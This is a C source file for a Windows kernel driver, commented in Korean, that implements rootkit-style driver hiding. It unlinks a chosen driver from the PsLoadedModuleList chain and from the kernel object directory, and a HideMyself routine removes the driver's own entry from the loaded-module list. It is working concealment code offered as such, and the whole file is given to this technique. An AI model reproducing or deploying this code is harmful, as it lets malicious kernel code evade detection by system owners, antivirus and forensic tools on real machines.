#include <ntifs.h>
#include <ntddk.h>
#include <wdm.h>
#include <ntimage.h>
#include <windef.h>
#include <ntstrsafe.h>
#include "hidedriver.h"
#include "define.h"
#include "undocumented.h"
#include "listentry.h"

extern PDRIVER_OBJECT g_pDriverObject;
PLDR_DATA_TABLE_ENTRY PsLoadedModuleList;

BOOLEAN HideDriverViaPsLoadedModuleList(PCWSTR szFileName)
{
	BOOLEAN Hide = FALSE;
	kprintf("===hide driver (PsLoadedModuleList traversing)===");
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry, Entry;
	Entry = (PLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->InLoadOrderLinks.Flink;

	//	int count = 0;

	while (Entry != PsLoadedModuleList)
	{
		//	kprintf("[%d] %p %ws %p", count++, Entry, Entry->FullDllName.Buffer, &Entry);
		if (0 == wcscmp((PCWSTR)Entry->FullDllName.Buffer, szFileName))
		{
			kprintf("found");
			prevEntry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Blink; // 이전 노드
			nextEntry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink; // 다음 노드
			prevEntry->InLoadOrderLinks.Flink = Entry->InLoadOrderLinks.Flink; // 이전 노드의 다음을 내 다음으로 바꿈
			nextEntry->InLoadOrderLinks.Blink = Entry->InLoadOrderLinks.Blink; // 다음 노드의 이전을 내 이전로 바꿈 
			// 내 노드의 앞, 뒤를 나 자신으로 바꿈
			// 바꾸지 않는다면 드라이버 서비스를 stop할때 BSOD발생 (KERNEL SECURITY CHECK FAILURE)
			Entry->InLoadOrderLinks.Flink = (PLIST_ENTRY)Entry;
			Entry->InLoadOrderLinks.Blink = (PLIST_ENTRY)Entry;
			Hide = TRUE;
			break;
		}

		Entry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
	}
	return Hide;
}


/* hide DRIVER_OBJECT
* service 이름과 DRIVER_OBJECT가 목록에서 날라감
* "\\Driver" 으로 오브젝트 목록 구하는것과 완전히 동일함
*/
BOOLEAN HideDriverFromObjectDirectory(PUNICODE_STRING pDriverName)
{
	kprintf("===hide driver (Object Directory Entry traversing)===");

	POBJECT_HEADER_NAME_INFO pObjectHeaderNameInfo;
	POBJECT_DIRECTORY pObjectDirectory;
		
	BOOLEAN bRet = FALSE;

	pObjectHeaderNameInfo = ObQueryNameInfo(g_pDriverObject);
	if (!MmIsAddressValid(pObjectHeaderNameInfo))
	{
		kprintf("ObQueryNameInfo occurs an error.\n");
		return FALSE;
	}
//	kprintf("name : %wZ\n", &pObjectHeaderNameInfo->Name);

	pObjectDirectory = pObjectHeaderNameInfo->Directory;

	int count;
	count = 0;
	for (int p = 0; p < 37; p++)
	{	
		POBJECT_DIRECTORY_ENTRY pBlinkObjectDirectoryEntry = NULL;
		POBJECT_DIRECTORY_ENTRY pObjectDirectoryEntry = pObjectDirectory->HashBuckets[p];
		
		// HashBuckets 가 NULL 인 경우도 많음 (대표적으로 \FileSystem)
		if (!MmIsAddressValid(pObjectDirectoryEntry))
		{
			continue;	
		}
		while (pObjectDirectoryEntry)
		{
		
			if (!MmIsAddressValid(pObjectDirectoryEntry) ||
				!MmIsAddressValid(pObjectDirectoryEntry->Object))
			{
				bRet = FALSE;
				break;				
			}
			
			pObjectHeaderNameInfo = ObQueryNameInfo(pObjectDirectoryEntry->Object);
		
		
			if (RtlEqualUnicodeString(pDriverName, &pObjectHeaderNameInfo->Name, TRUE))
			{
				kprintf("pObjectDirectoryEntry : %p", pObjectDirectoryEntry);
				kprintf("[%d %d] >>> %wZ", p, count++, pObjectHeaderNameInfo->Name);
				// 체인의 0번째(=헤드)가 자신의 Entry일때
				if (pObjectDirectory->HashBuckets[p] == pObjectDirectoryEntry)
				{
					kprintf("[Found] head node\n");
					pObjectDirectory->HashBuckets[p] = pObjectDirectoryEntry->ChainLink; // 자신Entry의 다음 Entry를 헤드로 만든다.
					pObjectDirectoryEntry->ChainLink = NULL;
				}
				else // 1번째부터
				{
					kprintf("[Found] no head node\n");
					pBlinkObjectDirectoryEntry->ChainLink = pObjectDirectoryEntry->ChainLink; // 이전 Entry의 다음 Entry를 내 다음 Entry로 가리킨다.
					pObjectDirectoryEntry->ChainLink = NULL;
				}
				bRet = TRUE;
				goto EXIT;
			}			

			pBlinkObjectDirectoryEntry = pObjectDirectoryEntry; // 0이 아닌 n번째 Entry에서 체인이 끊어질때를 대비
			pObjectDirectoryEntry = pObjectDirectoryEntry->ChainLink;

		}
	}
	kprintf("NOT FOUND!!!!!!!!!!!!!!!!!");
EXIT:
	return bRet;
}

VOID HideMyself()
{
	//KIRQL irql = KeRaiseIrqlToDpcLevel(); // 동작이 잘 안되면 IRQL 상승
	PLDR_DATA_TABLE_ENTRY currentEntry = (PLDR_DATA_TABLE_ENTRY)g_pDriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY prevEntry, nextEntry;

	prevEntry = (PLDR_DATA_TABLE_ENTRY)currentEntry->InLoadOrderLinks.Blink; // 이전 노드
	nextEntry = (PLDR_DATA_TABLE_ENTRY)currentEntry->InLoadOrderLinks.Flink; // 다음 노드
	prevEntry->InLoadOrderLinks.Flink = currentEntry->InLoadOrderLinks.Flink; // 이전 노드의 다음을 내 다음으로 바꿈
	nextEntry->InLoadOrderLinks.Blink = currentEntry->InLoadOrderLinks.Blink; // 다음 노드의 이전을 내 이전로 바꿈 

	// 내 노드의 앞, 뒤를 나 자신으로 바꿈
	// 바꾸지 않는다면 드라이버 서비스를 stop할때 BSOD발생 (KERNEL SECURITY CHECK FAILURE)
	currentEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY)currentEntry;
	currentEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY)currentEntry;

	// KeLowerIrql(irql); 
}

BOOLEAN HideDriver(LPCWSTR pDriverPath, LPCWSTR pServiceName)
{
	UNICODE_STRING ServiceName;
	RtlInitUnicodeString(&ServiceName, pServiceName);
	UNICODE_STRING Empty = RTL_CONSTANT_STRING(L"");
	BOOLEAN bHide = FALSE;
	BOOLEAN bHide2 = FALSE;
	BOOLEAN bRet = FALSE;
	if (0 != wcscmp(pDriverPath, L""))
	{
		bHide = HideDriverViaPsLoadedModuleList(pDriverPath);
	}
	if (!RtlEqualUnicodeString(&Empty, &ServiceName, TRUE))
	{
		bHide2 = HideDriverFromObjectDirectory(&ServiceName);
	}

	if (TRUE == bHide || TRUE == bHide2)
	{
		bRet = TRUE;
	}
	else if (FALSE == bHide && FALSE == bHide2)
	{
		bRet = FALSE;
	}

	return bRet;
}